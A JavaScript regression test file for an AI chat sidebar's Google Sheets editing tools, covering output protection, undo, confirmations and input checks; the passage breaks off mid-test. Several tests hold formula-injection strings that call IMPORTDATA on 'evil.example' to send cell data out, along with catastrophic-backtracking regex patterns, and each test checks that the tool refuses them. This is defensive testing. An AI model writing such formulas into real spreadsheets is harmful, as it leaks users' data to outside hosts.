import test from 'node:test';
import assert from 'node:assert/strict';
import { createDatamoovSandbox, plain } from './helpers/datamoov-sandbox.mjs';
import { chatSheetFixture, ORCHARD_COLUMNS } from './helpers/chat-sheet-fixture.mjs';

// Regressions found in reviews of the analyst sheet tools. Each test reproduces a confirmed
// finding: the protected-output guard, regular expressions in find_replace and search_sheets,
// the typed yes and what it covers, undo of structural edits, named ranges, conditional formats
// and tab copies after later changes, the hidden undo copy of a deleted tab, formula policy and
// read-back details, text that Sheets would read as a formula, and the prompt and capability
// text about what chat may change.

const BS = String.fromCharCode(92);
// Most tests save a two-row EUR report; the first group of findings used a one-row report.
const ONE_ROW = { rows: [{ date: '2026-08-01', campaign: 'Brand', spend: 1 }], metadata: {} };

function fixture(orchard = {}) {
  const f = chatSheetFixture({
    orchard: {
      columns: ORCHARD_COLUMNS.slice(0, 3),
      label: 'Daily',
      rows: [
        { date: '2026-08-01', campaign: 'Brand', spend: 10.5 },
        { date: '2026-08-02', campaign: 'Generic', spend: 5 },
      ],
      metadata: { currency: 'EUR' },
      token: 'review-private-token',
      ...orchard,
    },
  });
  // A saved report written at a cell of Output, after the chat edit it is compared with.
  f.report = (cell = 'A1') => {
    const { report, run } = f.saveReport({
      name: 'Late',
      fields: ['date', 'campaign', 'spend'],
      startCell: cell,
    });
    assert.equal(run.ok, true);
    return report;
  };
  f.confirmed = (call) => f.confirm(call).done;
  // Undo runs in a later chat request unless a session is given.
  f.undo = (input = { action: 'undo' }, session = f.api.dmvChatSession_(f.book)) =>
    plain(f.api.dmvChatUndoSheetEdit_(session, input));
  f.rule = (input) =>
    plain(f.api.dmvChatConditionalFormat_(f.session, { sheetName: f.sheet.name, ...input }));
  f.named = () => plain(f.book.server.namedRanges || []);
  f.values = (sheet, column, count) =>
    Array.from({ length: count }, (_, index) => f.value(sheet, index + 1, column));
  f.check = (formula) => {
    const sheet = f.session.spreadsheet.getSheets()[0];
    return plain(f.api.dmvChatSheetFormulaCheck_(f.session, formula, { sheet, cell: 'C1' }));
  };
  return f;
}

test('a dataset whose id ends in -report or -charts protects only its data, not its whole tab', () => {
  for (const dataset of ['main', 'report', 'charts', 'google-ads-report', 'meta-charts']) {
    const f = createDatamoovSandbox();
    const data = f.book.insertSheet('Main data');
    const page = f.book.insertSheet('Overview');
    const session = f.api.dmvChatSession_(f.book);
    const props = f.api.PropertiesService.getUserProperties();
    const receipt = (id, sheetId) =>
      props.setProperty(
        'dmv:v1:output:' + session.spreadsheetId + ':' + id,
        JSON.stringify({ sheetId, row: 1, column: 1, rows: 3, columns: 4, digest: 'x' })
      );
    props.setProperty('dmv:v1:dashboard:dash1', JSON.stringify({ id: 'dash1', name: 'Overview' }));
    receipt('dash1-d-' + dataset, data.id);
    receipt('dash1-report', page.id);
    const grid = (sheetId, row, column) => ({
      sheetId,
      startRowIndex: row,
      endRowIndex: row + 2,
      startColumnIndex: column,
      endColumnIndex: column + 2,
    });
    // Beside the data table chat may write; on it, it may not.
    f.api.dmvChatSheetGuard_(session, [grid(data.id, 0, 5)]);
    assert.throws(
      () => f.api.dmvChatSheetGuard_(session, [grid(data.id, 0, 0)]),
      /output of the dashboard "Overview" on tab "Main data"/,
      dataset
    );
    // The dashboard page itself stays protected whole.
    assert.throws(
      () => f.api.dmvChatSheetGuard_(session, [grid(page.id, 40, 20)]),
      /output of the dashboard "Overview" on tab "Overview"/
    );
  }
});

test('a regular-expression replacement only uses $1 to $9, so Sheets writes what was checked', () => {
  const f = fixture(ONE_ROW);
  f.setCell(f.sheet, 1, 1, 'x1');
  f.setCell(f.sheet, 2, 1, 'x2');
  const replace = (find, replacement) =>
    f.edit('find_replace', { find, replacement, useRegex: true }, f.inspect('A1:A2'));
  const before = f.state.batches.length;
  // Java's replacement rules (what Sheets applies) turn \= into =, and $0, $&, $` and $' differ
  // from JavaScript's, so the result checked here would not be the one Sheets writes.
  for (const replacement of [
    BS + '=IMPORTDATA("https://evil.example/?q="&B1)&',
    BS + '+1',
    '$&',
    "x$'",
    '$`',
    '$0',
    '${name}',
    'cost $',
  ])
    assert.throws(
      () => replace('^x', replacement),
      /use \$1 to \$9/,
      'replacement ' + JSON.stringify(replacement)
    );
  assert.throws(() => replace('^(x)', 'y$2'), /has 1 group/);
  assert.equal(f.state.batches.length, before, 'nothing was sent');
  // Groups the pattern has still work, and literal text needs no regular expression.
  const done = replace('^(x)(\\d)', 'item-$2');
  assert.equal(done.ok, true, JSON.stringify(done));
  assert.equal(f.state.batches.at(-1).body.requests[0].findReplace.replacement, 'item-$2');
  assert.equal(
    f.edit('find_replace', { find: 'item', replacement: '$ ' + BS }, f.inspect('A1:A2')).ok,
    true
  );
});

test('a typed answer approves a confirmation only when it is a plain yes', () => {
  for (const [reply, approved] of [
    ['Yes', true],
    ['yes please', true],
    ['OK, go ahead', true],
    ['Yes, go ahead and delete it.', true],
    ['ok wait, no', false],
    ['Sure? what will it delete', false],
    ['yes but no, do not delete anything', false],
    ["Yes, don't delete it", false],
    ['ok, hold on', false],
    ['No', false],
  ]) {
    const f = fixture(ONE_ROW);
    f.book.insertSheet('Budget');
    const asked = f.tabAction('delete_sheet', { sheetName: 'Budget' });
    assert.equal(asked.needsConfirmation, true);
    const next = f.answer(reply);
    assert.equal(next.confirm.approved.length, approved ? 1 : 0, reply);
  }
});

test('undoing an insert or delete never moves report output written since', () => {
  for (const [action, cell, start] of [
    ['insert_rows', 'A20', 2],
    ['delete_rows', 'A20', 2],
    ['insert_columns', 'F40', 2],
    ['delete_columns', 'F40', 2],
  ]) {
    const f = fixture(ONE_ROW);
    const call = (session, extra) =>
      f.tabAction(action, { sheetName: 'Output', start, count: 2, ...extra }, session);
    const done = action.startsWith('delete') ? f.confirmed(call) : call(f.session, {});
    assert.equal(done.ok, true, JSON.stringify(done));
    f.report(cell);
    const [row, column] = cell === 'A20' ? [20, 1] : [40, 6];
    assert.equal(f.value(f.sheet, row, column), 'Date');
    const before = f.state.batches.length;
    assert.throws(() => f.undo(), /output of the saved report "Late"/, action);
    assert.equal(f.state.batches.length, before, action + ': nothing was sent');
    assert.equal(f.value(f.sheet, row, column), 'Date', action + ': the output stayed put');
  }
});

test('undoing an insert with no output after it still works', () => {
  const f = fixture(ONE_ROW);
  f.report('A1');
  const done = f.tabAction('insert_rows', { sheetName: 'Output', start: 10, count: 2 });
  assert.equal(done.ok, true, JSON.stringify(done));
  assert.equal(f.undo().ok, true);
});

test('nested or alternating repeated groups are refused before they run', () => {
  const f = fixture(ONE_ROW);
  f.setCell(f.sheet, 1, 1, 'aaaab');
  for (const query of ['(a|a)+$', '((a+))+$', '((a|a))+$', '(?:a|a)+$', '(a|aa)*b', '(\\w|a){2,}'])
    assert.throws(
      () => f.api.dmvChatSearchSheets_(f.session, { query, regex: true }),
      /repeats or has alternatives/,
      'search ' + query
    );
  for (const find of ['((a+))+$', '((a|a))+$', '(x(a*))*'])
    assert.throws(
      () => f.edit('find_replace', { find, replacement: 'b', useRegex: true }, f.inspect('A1')),
      /repeats or has alternatives/,
      'find_replace ' + find
    );
  // Ordinary patterns, including groups that repeat a fixed text, still work.
  for (const query of ['^a+b$', '(ab|ba)', '^(Mr|Mrs)\\.? ', '(\\d{3})-', '[(a+)]+', '\\(a+\\)+'])
    f.api.dmvChatSearchSheets_(f.session, { query, regex: true });
  assert.equal(
    plain(f.api.dmvChatSearchSheets_(f.session, { query: 'a{4}b', regex: true })).total,
    1
  );
});

test('search_sheets skips cells too long for a regular expression and says so', () => {
  const f = fixture(ONE_ROW);
  f.setCell(f.sheet, 1, 1, 'a'.repeat(6000) + 'b');
  f.setCell(f.sheet, 2, 1, 'ab');
  const found = plain(f.api.dmvChatSearchSheets_(f.session, { query: 'a+b', regex: true }));
  assert.equal(found.total, 1);
  assert.deepEqual(
    found.matches.map((match) => match.cell),
    ['Output!A2']
  );
  assert.equal(found.longCells, 1);
  assert.match(found.note, /longer than 5,000 characters/);
  // Plain text searches read every cell.
  assert.equal(plain(f.api.dmvChatSearchSheets_(f.session, { query: 'ab' })).total, 2);
});

test('a hidden undo copy is removed by the first chat request after its undo window', () => {
  const f = fixture(ONE_ROW);
  const salaries = f.book.insertSheet('Salaries');
  f.setCell(salaries, 1, 1, 'secret 100000');
  const deleted = f.confirmed((session, extra) =>
    f.tabAction('delete_sheet', { sheetName: 'Salaries', ...extra }, session)
  );
  assert.equal(deleted.ok, true);
  assert.match(deleted.note, /hidden copy "DataMoov undo · Salaries"/);
  const copy = () => f.book.sheets.find((sheet) => sheet.name.startsWith('DataMoov undo'));
  assert.ok(copy()?.hidden);
  f.api.dmvSaveAiSettings({ provider: 'anthropic', apiKey: 'sk-ant-offline-review-0001' });
  const answer = () => ({
    body: { content: [{ type: 'text', text: 'Hello.' }], stop_reason: 'end_turn' },
  });
  // Within the window a new request keeps it, so undo still works.
  f.state.responses.push(answer());
  assert.equal(plain(f.api.dmvChat({ text: 'Hi', transcript: [] })).failed, false);
  assert.ok(copy());
  f.advance(7 * 3600 * 1000);
  f.state.responses.push(answer());
  assert.equal(plain(f.api.dmvChat({ text: 'Hi again', transcript: [] })).failed, false);
  assert.equal(copy(), undefined);
  assert.equal(
    f.api.PropertiesService.getUserProperties().getProperty('dmv:v1:undo-tabs:' + f.book.id),
    null
  );
});

test('undoing duplicate_sheet links to no tab, since the copy is gone', () => {
  const f = fixture(ONE_ROW);
  const done = f.tabAction('duplicate_sheet', { sheetName: 'Output' });
  assert.equal(done.ok, true);
  const session = f.api.dmvChatSession_(f.book);
  const undone = f.undo(undefined, session);
  assert.equal(undone.ok, true);
  assert.equal(
    f.book.sheets.some((sheet) => sheet.name === done.sheetName),
    false
  );
  assert.equal(undone.url, null);
  const event = session.events.at(-1);
  assert.equal(event.kind, 'write');
  assert.deepEqual(plain(event.links), []);
});

test('array lookups inside ARRAYFORMULA are read back where they spill', () => {
  const f = fixture(ONE_ROW);
  f.sheet.maxRows = 1000;
  f.book.insertSheet('Data');
  const session = f.api.dmvChatSession_(f.book);
  const sheet = session.spreadsheet.getSheetByName('Output');
  const shape = (formula) =>
    plain(f.api.dmvChatSheetFormulaCheck_(session, formula, { sheet })).shape;
  for (const formula of [
    '=ARRAYFORMULA(VLOOKUP(A2:A5,Data!A:C,3,FALSE))',
    '=ARRAYFORMULA(IFERROR(VLOOKUP(A2:A5,Data!A:C,3,FALSE),""))',
    '=ARRAYFORMULA(COUNTIF(A2:A100,A2:A100))',
    '=ARRAYFORMULA(MATCH(A2:A5,Data!A:A,0))',
    '=ARRAYFORMULA(RANK(A2:A5,A2:A5))',
  ])
    assert.equal(shape(formula), null, formula);
  // Outside ARRAYFORMULA, or reducing a range, the result is still one cell.
  for (const formula of [
    '=VLOOKUP(A2,Data!A:C,3,FALSE)',
    '=ARRAYFORMULA(SUM(A2:A5))',
    '=COUNTIF(A2:A100,"x")',
    '=ARRAYFORMULA(COUNTIF(B2,"x"))',
  ])
    assert.deepEqual(shape(formula), { rows: 1, columns: 1 }, formula);
  const area = {
    columns: 1,
    grid: {
      sheetId: sheet.getSheetId(),
      startRowIndex: 1,
      endRowIndex: 2,
      startColumnIndex: 1,
      endColumnIndex: 2,
    },
  };
  const policy = plain(
    f.api.dmvChatSheetFormulaPolicy_(session, sheet, area, [
      ['=ARRAYFORMULA(VLOOKUP(A2:A5,Data!A:C,3,FALSE))'],
    ])
  );
  assert.deepEqual(policy.unknown, [[1, 1]]);
});

test('custom conditional-format formulas refer only to their own tab and fill no cells', () => {
  const f = createDatamoovSandbox({ gridData: true });
  const source = f.book.sheets[0];
  source.name = 'Source';
  f.setCell(f.book.insertSheet('Targets'), 1, 2, 50);
  [
    ['Date', 'Campaign', 'Currency', 'Spend'],
    ['2026-08-01', 'Brand', 'EUR', 10],
    ['2026-08-02', 'Generic', 'EUR', 60],
  ].forEach((row, r) => row.forEach((value, c) => f.setCell(source, r + 3, c + 2, value)));
  const session = f.api.dmvChatSession_(f.book);
  const add = (value, range = 'E4:E5') =>
    plain(
      f.api.dmvChatConditionalFormat_(session, {
        sheetName: 'Source',
        action: 'add',
        range,
        condition: { type: 'custom_formula', value },
        format: { bold: true },
      })
    );
  const before = f.state.batches.length;
  for (const value of [
    '=$E4>Targets!$B$1',
    "=$E4>'Targets'!B1",
    '=$E4>XLOOKUP($C4,Targets!A:A,Targets!B:B)',
  ])
    assert.throws(() => add(value), /only to cells of its own tab \("Source"\)/, value);
  assert.equal(f.state.batches.length, before, 'nothing was sent');
  assert.throws(() => add('=IMPORTRANGE("abc","A1")>0'), /IMPORTRANGE/);
  // A rule is not a formula in a cell: an array result next to data is no spill.
  assert.equal(add('=$E4>Source!$E$5').ok, true);
  assert.equal(add('={1,2}', 'C4:F5').ok, true);
});

test('a dashboard can be removed after chat deleted the last other tab into a hidden undo copy', () => {
  const f = fixture();
  const saved = plain(
    f.api.dmvSaveDashboard({
      name: 'Overview',
      target: { sheetName: 'Dash' },
      datasets: [
        {
          id: 'main',
          label: 'Main',
          sheetName: 'Main data',
          connectionId: f.connection.id,
          reportType: 'daily',
          fields: ['date', 'campaign', 'spend'],
          config: {},
          dateRange: { preset: 'lastMonth' },
          maxRows: 100,
        },
      ],
      tiles: [
        { title: 'Totals', type: 'kpi', metrics: [{ field: 'spend', agg: 'sum' }] },
        {
          title: 'Spend by campaign',
          type: 'column',
          groupBy: ['campaign'],
          metrics: [{ field: 'spend', agg: 'sum' }],
        },
      ],
    })
  );
  f.api.dmvRunDashboard(saved.id);
  const first = f.book.sheets[0].name;
  const done = f.confirmed((session, extra) =>
    f.tabAction('delete_sheet', { sheetName: first, ...extra }, session)
  );
  assert.equal(done.ok, true);
  assert.ok(f.book.sheets.some((sheet) => sheet.hidden && /^DataMoov undo · /.test(sheet.name)));
  // Only hidden tabs would remain, so removal adds a visible one first, as when no tab remains.
  const removed = plain(f.api.dmvDeleteDashboard(saved.id));
  assert.equal(removed.ok, true);
  assert.equal(removed.deletedTabs, 3);
  assert.deepEqual(f.requests()[0], { addSheet: { properties: {} } });
  const left = f.book.sheets.map((sheet) => [/^DataMoov undo · /.test(sheet.name), !!sheet.hidden]);
  assert.deepEqual(left.sort(), [
    [false, false],
    [true, true],
  ]);
});

test('dashboard removal beside another visible tab still adds no tab', () => {
  const f = fixture();
  const saved = plain(
    f.api.dmvSaveDashboard({
      name: 'Overview',
      target: { sheetName: 'Dash' },
      datasets: [
        {
          id: 'main',
          label: 'Main',
          sheetName: 'Main data',
          connectionId: f.connection.id,
          reportType: 'daily',
          fields: ['date', 'campaign', 'spend'],
          config: {},
          dateRange: { preset: 'lastMonth' },
          maxRows: 100,
        },
      ],
      tiles: [
        { title: 'Totals', type: 'kpi', metrics: [{ field: 'spend', agg: 'sum' }] },
        {
          title: 'Spend by campaign',
          type: 'column',
          groupBy: ['campaign'],
          metrics: [{ field: 'spend', agg: 'sum' }],
        },
      ],
    })
  );
  f.api.dmvRunDashboard(saved.id);
  plain(f.api.dmvDeleteDashboard(saved.id));
  assert.ok(f.requests().every((request) => request.deleteSheet));
  assert.deepEqual(
    f.book.sheets.map((sheet) => sheet.name),
    ['Output']
  );
});

test('the capabilities no longer say chat cannot delete tabs, since edit_sheet can', () => {
  const f = fixture();
  const tools = plain(f.api.dmvChatTools_(f.session));
  const edit = tools.find((tool) => tool.name === 'edit_sheet');
  assert.ok(edit.input_schema.properties.action.enum.includes('delete_sheet'));
  const prompt = f.api.dmvChatSystemPrompt_(f.session);
  const line = prompt.split('\n').find((text) => text.startsWith('Not possible:'));
  assert.ok(line);
  assert.doesNotMatch(line, /deleting tabs from chat/);
  assert.match(line, /deleting from chat a tab that a saved report or dashboard writes to/);
});

test('text condition values starting with = or + are refused, since Sheets reads them as formulas', () => {
  const f = fixture();
  f.sheet.name = 'Source';
  for (const value of [
    '+IMPORTDATA("https://evil.example/?"&$B$2)',
    '+INDIRECT("Other!A1")',
    ' =IMPORTDATA("x")',
    '+44',
  ]) {
    for (const type of ['text_contains', 'text_starts_with', 'text_eq']) {
      const before = f.state.batches.length;
      assert.throws(
        () =>
          f.rule({
            action: 'add',
            range: 'A2:A4',
            condition: { type, value },
            format: { backgroundColor: '#FF0000' },
          }),
        /cannot start with = or \+, which Sheets reads as a formula\. Use custom_formula instead\./,
        value
      );
      assert.equal(f.state.batches.length, before, 'nothing sent');
      // Pivot filters build their conditions the same way.
      assert.throws(
        () => f.api.dmvChatSheetCondition_({ type, value }, { formatting: false }),
        /cannot start with = or \+, which Sheets reads as a formula\. Choose other text\./
      );
    }
  }
  // Other text, a + inside it and a - at the start, are still ordinary text conditions.
  for (const value of ['UK +44', '-', 'Brand']) {
    const result = f.rule({
      action: 'add',
      range: 'A2:A4',
      condition: { type: 'text_contains', value },
      format: { backgroundColor: '#FF0000' },
    });
    assert.equal(result.ok, true);
    assert.deepEqual(plain(f.requests()[0].addConditionalFormatRule.rule.booleanRule.condition), {
      type: 'TEXT_CONTAINS',
      values: [{ userEnteredValue: value }],
    });
  }
});

function rulesFixture() {
  const f = fixture();
  f.sheet.name = 'Source';
  ['Email', 'a', 'b', 'a', 'c', 'b'].forEach((value, index) =>
    f.setCell(f.sheet, index + 1, 3, value)
  );
  [1, 2, 3, 4, 5, 6].forEach((value, index) => f.setCell(f.sheet, index + 1, 5, value * 10));
  f.userRule = {
    ranges: [
      {
        sheetId: f.sheet.id,
        startRowIndex: 0,
        endRowIndex: 6,
        startColumnIndex: 0,
        endColumnIndex: 1,
      },
    ],
    booleanRule: { condition: { type: 'BLANK' }, format: { textFormat: { italic: true } } },
  };
  f.add = () =>
    f.rule({
      action: 'add',
      range: 'E2:E6',
      condition: { type: 'number_gt', value: 10 },
      format: { backgroundColor: '#FF0000' },
    });
  return f;
}

test('undo of an added conditional format refuses once the rules of the tab changed', () => {
  // The user replaced chat's rule by hand with one of their own.
  const f = rulesFixture();
  assert.match(f.add().undoId, /^u[a-f0-9]{12}$/);
  f.sheet.conditionalFormats.splice(0, f.sheet.conditionalFormats.length, f.userRule);
  const before = f.state.batches.length;
  assert.throws(
    () => f.undo(),
    /The conditional format rules of Source changed since that edit, so it cannot be undone here/
  );
  assert.equal(f.state.batches.length, before);
  assert.deepEqual(plain(f.conditionalFormats(f.sheet)), [f.userRule]);

  // The user put a rule of their own before chat's.
  const g = rulesFixture();
  g.add();
  const chatRule = plain(g.sheet.conditionalFormats[0]);
  g.sheet.conditionalFormats.unshift(g.userRule);
  assert.throws(() => g.undo(), /changed since that edit/);
  assert.deepEqual(plain(g.conditionalFormats(g.sheet)), [g.userRule, chatRule]);

  // Untouched, undo still removes the rule.
  const h = rulesFixture();
  h.add();
  assert.equal(h.undo().ok, true);
  assert.deepEqual(plain(h.conditionalFormats(h.sheet)), []);
});

test('undo of a deleted conditional format refuses once the rules of the tab changed', () => {
  const f = rulesFixture();
  f.add();
  const { ruleId } = f.rule({ action: 'list' }).rules[0];
  const deleted = f.rule({ action: 'delete', ruleId });
  assert.equal(deleted.ok, true);
  f.sheet.conditionalFormats.push(f.userRule);
  assert.throws(() => f.undo(), /changed since that edit/);
  assert.deepEqual(plain(f.conditionalFormats(f.sheet)), [f.userRule]);

  const g = rulesFixture();
  g.add();
  const listed = g.rule({ action: 'list' }).rules;
  g.rule({ action: 'delete', ruleId: listed[0].ruleId });
  assert.equal(g.undo().ok, true);
  assert.deepEqual(g.rule({ action: 'list' }).rules, listed);
});

test('undo of an older highlight_duplicates refuses rather than delete the newer rule', () => {
  const f = rulesFixture();
  const first = f.edit('highlight_duplicates', {}, f.inspect('C1:C6'));
  f.edit('highlight_duplicates', { color: '#00FF00' }, f.inspect('E1:E6'));
  const rules = plain(f.conditionalFormats(f.sheet));
  assert.throws(() => f.undo({ action: 'undo', id: first.undoId }), /changed since that edit/);
  assert.deepEqual(plain(f.conditionalFormats(f.sheet)), rules);
  // Newest first still works, then the older one.
  assert.equal(f.undo().ok, true);
  assert.equal(f.undo().ok, true);
  assert.deepEqual(plain(f.conditionalFormats(f.sheet)), []);
});

test('split_columns refuses pieces that Sheets would enter as formulas', () => {
  const f = fixture();
  f.setCell(f.sheet, 1, 1, 'Brand,=IMPORTDATA("https://evil.example/?q="&D2&D3)');
  f.setCell(f.sheet, 2, 1, 'Generic,x');
  const before = f.state.batches.length;
  assert.throws(
    () => f.edit('split_columns', { delimiter: 'comma' }, f.inspect('A1:A2')),
    /Splitting Output!A1 would give a piece starting with =, which Sheets reads as a formula/
  );
  for (const [text, start] of [
    ['Brand, +44 20', '\\+'],
    ['Brand,-SUM(D1:D9)', '-'],
    ['+Brand', '\\+'],
  ]) {
    f.setCell(f.sheet, 1, 1, text);
    assert.throws(
      () => f.edit('split_columns', { delimiter: 'auto' }, f.inspect('A1:A2')),
      new RegExp('a piece starting with ' + start + ', which Sheets reads as a formula')
    );
  }
  assert.equal(f.state.batches.length, before, 'nothing sent');
  // A lone dash between words and negative numbers split as before.
  f.setCell(f.sheet, 1, 1, 'Brand - Search');
  f.setCell(f.sheet, 2, 1, 'Refund -5 -1.5 -$3');
  const done = f.edit('split_columns', { delimiter: 'space' }, f.inspect('A1:A2'));
  assert.equal(done.ok, true);
  assert.deepEqual(f.requests()[0].textToColumns.delimiterType, 'SPACE');
});

test('the confirmation chip shows the scope of a whole-tab find_replace in full', () => {
  const f = fixture();
  for (let row = 1; row <= 40; row++) f.setCell(f.sheet, row, 1, '{{x}}');
  f.sheet.maxRows = 40;
  const replacement = '" in 1 cell of Output!A2.' + ' '.repeat(10) + 'L'.repeat(230);
  const asked = f.edit(
    'find_replace',
    { find: '{{x}}', replacement, wholeSheet: true },
    f.inspect('A1:A2')
  );
  assert.equal(asked.needsConfirmation, true);
  const chip = plain(f.session.events.at(-1)).text;
  assert.equal(chip, 'Asked to confirm: ' + asked.summary);
  assert.match(chip, / in 40 cells of Output!A1:A40 \(the whole tab\)\.$/);
  // The model's text is quoted with its quotes escaped and cut short.
  assert.match(chip, /with "\\" in 1 cell of Output!A2\. {10}L+…"/);
  assert.ok(asked.summary.length < 200, asked.summary);
});

test('move_range moves everything only, since Sheets cuts the whole source', () => {
  const f = fixture();
  f.setCell(f.sheet, 1, 1, 'a');
  f.setCell(f.sheet, 2, 1, 'b');
  const before = f.state.batches.length;
  for (const pasteType of ['values', 'formats', 'formulas'])
    assert.throws(
      () => f.edit('move_range', { destination: 'D1', pasteType }, f.inspect('A1:A2')),
      new RegExp('move_range always moves everything .* use copy_range with that pasteType')
    );
  assert.equal(f.state.batches.length, before, 'nothing sent');
  assert.equal(f.value(f.sheet, 1, 1), 'a');
  // pasteType all, and copy_range with any paste type, are unchanged.
  const copied = f.edit(
    'copy_range',
    { destination: 'D1', pasteType: 'values' },
    f.inspect('A1:A2')
  );
  assert.equal(copied.ok, true);
  const moved = f.edit('move_range', { destination: 'F1', pasteType: 'all' }, f.inspect('A1:A2'));
  assert.equal(moved.ok, true);
  assert.equal(f.value(f.sheet, 1, 6), 'a');
  const schema = plain(f.api.dmvChatTools_(f.session)).find((tool) => tool.name === 'edit_sheet');
  assert.match(schema.input_schema.properties.pasteType.description, /move_range takes only all/);
});

test('formatting over report output can be undone, like the edit itself', () => {
  const f = fixture();
  const report = f.api.dmvSaveReport({
    connectionId: f.connection.id,
    name: 'Daily',
    reportType: 'daily',
    fields: ['date', 'campaign', 'spend'],
    config: {},
    maxRows: 100,
    dateRange: { preset: 'lastMonth' },
    target: { sheetName: 'Output', startCell: 'A1' },
    schedule: 'manual',
  });
  assert.equal(f.api.dmvRunReport(report.id).ok, true);
  const before = plain(f.format(f.sheet, 2, 1));
  const edited = f.edit('format', { format: { backgroundColor: '#ff0000' } }, f.inspect('A2:B2'));
  assert.match(edited.undoId, /^u[a-f0-9]{12}$/);
  assert.notDeepEqual(plain(f.format(f.sheet, 2, 1)), before);
  const undone = f.undo();
  assert.equal(undone.ok, true);
  assert.deepEqual(plain(f.format(f.sheet, 2, 1)), before);
  assert.equal(f.value(f.sheet, 2, 2), 'Brand');
  // The report still refreshes over its output.
  assert.equal(f.api.dmvRunReport(report.id).ok, true);
  // Values over the output stay refused, and so does their undo path.
  assert.throws(
    () => f.edit('set_values', { values: [['x', 'y']] }, f.inspect('A2:B2')),
    /output of the saved report "Daily"/
  );
});

test('undo puts back rows and columns deleted at the end of a tab', () => {
  const f = fixture();
  f.sheet.maxRows = 100;
  f.sheet.maxColumns = 26;
  f.setCell(f.sheet, 98, 1, 'row 98');
  f.setCell(f.sheet, 100, 1, 'row 100');
  f.setCell(f.sheet, 1, 26, 'column Z');
  const rows = f.confirmed((session, extra) =>
    f.tabAction('delete_rows', { sheetName: 'Output', start: 96, count: 5, ...extra }, session)
  );
  assert.equal(rows.ok, true);
  assert.equal(f.sheet.maxRows, 95);
  assert.equal(f.undo().ok, true);
  assert.deepEqual(f.requests()[0].insertDimension.inheritFromBefore, true);
  assert.equal(f.sheet.maxRows, 100);
  assert.equal(f.value(f.sheet, 98, 1), 'row 98');
  assert.equal(f.value(f.sheet, 100, 1), 'row 100');

  const columns = f.confirmed((session, extra) =>
    f.tabAction('delete_columns', { sheetName: 'Output', start: 26, count: 1, ...extra }, session)
  );
  assert.equal(columns.ok, true);
  assert.equal(f.sheet.maxColumns, 25);
  assert.equal(f.undo().ok, true);
  assert.equal(f.sheet.maxColumns, 26);
  assert.equal(f.value(f.sheet, 1, 26), 'column Z');

  // In the middle of a tab the rows below are still the ones to inherit from.
  f.setCell(f.sheet, 3, 1, 'row 3');
  f.confirmed((session, extra) =>
    f.tabAction('delete_rows', { sheetName: 'Output', start: 2, count: 2, ...extra }, session)
  );
  assert.equal(f.undo().ok, true);
  assert.deepEqual(f.requests()[0].insertDimension.inheritFromBefore, false);
  assert.equal(f.value(f.sheet, 3, 1), 'row 3');
});

test('the sandbox refuses an append that does not inherit from before, as Sheets does', () => {
  const f = createDatamoovSandbox({ gridData: true });
  f.batch = (requests) => plain(f.api.Sheets.Spreadsheets.batchUpdate({ requests }, f.book.id));
  const sheet = f.book.sheets[0];
  sheet.maxRows = 10;
  assert.throws(
    () =>
      f.batch([
        {
          insertDimension: {
            range: { sheetId: sheet.id, dimension: 'ROWS', startIndex: 10, endIndex: 12 },
            inheritFromBefore: false,
          },
        },
      ]),
    /insertDimension: range\.startIndex must be less than the grid size \(10\) if inheritFromBefore is false/
  );
  f.batch([
    {
      insertDimension: {
        range: { sheetId: sheet.id, dimension: 'ROWS', startIndex: 10, endIndex: 12 },
        inheritFromBefore: true,
      },
    },
  ]);
  assert.equal(sheet.maxRows, 12);
});

test('the prompt, capabilities and edit_sheet keep formatting and freezing on report output', () => {
  const f = fixture();
  const report = f.api.dmvSaveReport({
    connectionId: f.connection.id,
    name: 'Daily',
    reportType: 'daily',
    fields: ['date', 'campaign', 'spend'],
    config: {},
    maxRows: 100,
    dateRange: { preset: 'lastMonth' },
    target: { sheetName: 'Output', startCell: 'A1' },
    schedule: 'manual',
  });
  assert.equal(f.api.dmvRunReport(report.id).ok, true);
  const prompt = f.api.dmvChatSystemPrompt_(f.session);
  assert.match(
    prompt,
    /Never edit report or dashboard output \(change the report instead\), except to format it, add conditional formats or a filter, or freeze panes, which a refresh keeps;/
  );
  const can = prompt.split('\n').find((line) => line.startsWith('Chat (sidebar:chat) can:'));
  assert.doesNotMatch(can, /never over report or dashboard output/);
  assert.match(
    can,
    /on report or dashboard output, only formatting, conditional formats, filters and freeze panes/
  );
  const edit = plain(f.api.dmvChatTools_(f.session)).find((tool) => tool.name === 'edit_sheet');
  assert.doesNotMatch(edit.description, /cannot be changed here/);
  assert.match(
    edit.description,
    /On report and dashboard output only format, filter and freeze are allowed \(conditional_format too\), since a refresh keeps them; change the report for anything else\./
  );
  // What the text allows is what the tools do on that output.
  assert.equal(f.edit('format', { format: { bold: true } }, f.inspect('A1:C1')).ok, true, 'format');
  assert.equal(f.edit('freeze', { frozenRows: 1 }, f.inspect('A1')).ok, true, 'freeze');
  const rule = plain(
    f.api.dmvChatConditionalFormat_(f.session, {
      sheetName: 'Output',
      action: 'add',
      range: 'C2:C3',
      condition: { type: 'number_gt', value: 6 },
      format: { backgroundColor: '#FF0000' },
    })
  );
  assert.equal(rule.ok, true, JSON.stringify(rule));
  assert.throws(
    () => f.edit('set_values', { values: [['x']] }, f.inspect('B2')),
    /output of the saved report "Daily"/
  );
  assert.equal(f.api.dmvRunReport(report.id).ok, true);
});

test('undo of a named_range edit refuses once the name was changed since', () => {
  const f = fixture();
  const output = "'Output'!";
  f.tabAction('named_range', {
    namedRange: { operation: 'add', name: 'Budget', range: output + 'A1:A10' },
  });
  const updated = f.tabAction('named_range', {
    namedRange: { operation: 'update', name: 'Budget', range: output + 'A1:A20' },
  });
  assert.match(updated.undoId, /^u[a-f0-9]{12}$/);
  const id = f.named()[0].namedRangeId;
  // The user moves Budget to D1:D50 by hand.
  const moved = {
    sheetId: f.sheet.id,
    startRowIndex: 0,
    endRowIndex: 50,
    startColumnIndex: 3,
    endColumnIndex: 4,
  };
  f.byHand({
    updateNamedRange: { namedRange: { namedRangeId: id, range: moved }, fields: 'range' },
  });
  const batches = f.state.batches.length;
  assert.throws(() => f.undo(), /The named range "Budget" changed since that edit/);
  assert.equal(f.state.batches.length, batches, 'nothing was sent');
  assert.deepEqual(f.named()[0].range, moved);
  // Undoing the add after a rename by hand would delete the user's name.
  f.byHand({
    updateNamedRange: { namedRange: { namedRangeId: id, name: 'Plan' }, fields: 'name' },
  });
  assert.throws(() => f.undo({ action: 'undo', id: updated.undoId }), /changed since/);
  const list = f.undo({ action: 'list' }).entries;
  assert.throws(() => f.undo({ action: 'undo', id: list[1].id }), /changed since/);
  assert.equal(f.named().length, 1);
  assert.equal(f.named()[0].name, 'Plan');
});

test('undo of a named_range edit still works while the name is as the edit left it', () => {
  const f = fixture();
